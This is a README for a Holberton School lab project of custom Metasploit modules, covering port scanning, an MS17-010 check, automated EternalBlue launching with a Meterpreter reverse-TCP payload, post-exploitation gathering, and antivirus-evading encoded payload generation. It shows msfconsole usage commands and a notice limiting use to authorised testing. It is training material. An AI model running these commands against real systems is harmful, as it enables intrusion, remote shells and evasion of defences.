# Metasploit Scripting

Custom Metasploit modules for penetration testing and security assessment.

## Project Overview

This project contains custom Ruby modules for the Metasploit Framework covering:
- Port scanning
- Vulnerability checking (MS17-010)
- Automated exploit launching
- Post-exploitation information gathering
- Custom payload generation with encoding

## Requirements

- Kali Linux (or any Linux with Metasploit installed)
- Metasploit Framework
- Ruby

## Project Structure

```
0x04_metasploit_scripting/
├── README.md
├── custom_port_scanner.rb      # Task 0: TCP port scanner
├── vulnerability_checker.rb    # Task 1: MS17-010 checker
├── automated_exploit_launcher.rb # Task 2: Exploit automation
├── information_gathering.rb    # Task 3: Post-exploitation info
└── custom_payload_generator.rb # Task 4: Encoded payload generator
```

## Installation

Load modules in Metasploit:

```bash
msfconsole
msf6 > loadpath /path/to/0x04_metasploit_scripting/
```

## Modules

### 0. Custom Port Scanner

Scans a range of TCP ports on a target system.

```
msf6 > use auxiliary/scanner/custom_port_scanner
msf6 > set RHOST 192.168.1.100
msf6 > set STARTPORT 20
msf6 > set ENDPORT 1000
msf6 > run
```

**Options:**
| Option | Description | Default |
|--------|-------------|---------|
| RHOST | Target IP | - |
| STARTPORT | Start port | 1 |
| ENDPORT | End port | 1000 |
| TIMEOUT | Connection timeout | 1 |

### 1. Vulnerability Checker (MS17-010)

Checks if a target is vulnerable to EternalBlue (MS17-010).

```
msf6 > use auxiliary/scanner/ms17_010_checker
msf6 > set RHOST 192.168.1.100
msf6 > run
```

**Options:**
| Option | Description | Default |
|--------|-------------|---------|
| RHOST | Target IP | - |
| TIMEOUT | Connection timeout | 10 |

### 2. Automated Exploit Launcher

Automatically launches an exploit with a specified payload.

```
msf6 > use auxiliary/automated_exploit_launcher
msf6 > set RHOST 192.168.1.100
msf6 > set EXPLOIT exploit/windows/smb/ms17_010_eternalblue
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > run
```

**Options:**
| Option | Description | Default |
|--------|-------------|---------|
| RHOST | Target IP | - |
| EXPLOIT | Exploit module path | - |
| PAYLOAD | Payload to use | - |
| LHOST | Local IP | - |
| LPORT | Local port | 4444 |

### 3. Information Gathering (Post-Exploitation)

Gathers system information from a compromised Windows target.

```
msf6 > use post/windows/gather/information_gathering
msf6 > set SESSION 1
msf6 > run
```

**Requires:** Active Meterpreter session on Windows target.

**Gathers:**
- OS version and computer name
- Current user
- Network interfaces and IPs
- Running processes

### 4. Custom Payload Generator

Generates encoded payloads to evade antivirus detection.

```
msf6 > use auxiliary/custom_payload_generator
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > set ENCODER x86/shikata_ga_nai
msf6 > set ITERATIONS 5
msf6 > run
```

**Options:**
| Option | Description | Default |
|--------|-------------|---------|
| PAYLOAD | Payload type | windows/meterpreter/reverse_tcp |
| LHOST | Local IP | - |
| LPORT | Local port | 4444 |
| ENCODER | Encoder to use | x86/shikata_ga_nai |
| ITERATIONS | Encoding iterations | 5 |
| FORMAT | Output format | raw |
| OUTFILE | Output file path | - |

## Security Notice

These modules are for **educational purposes** and **authorized testing only**.

- Only use on systems you have permission to test
- Unauthorized access to computer systems is illegal
- Follow responsible disclosure practices

## Author

Holberton School - Cybersecurity Program
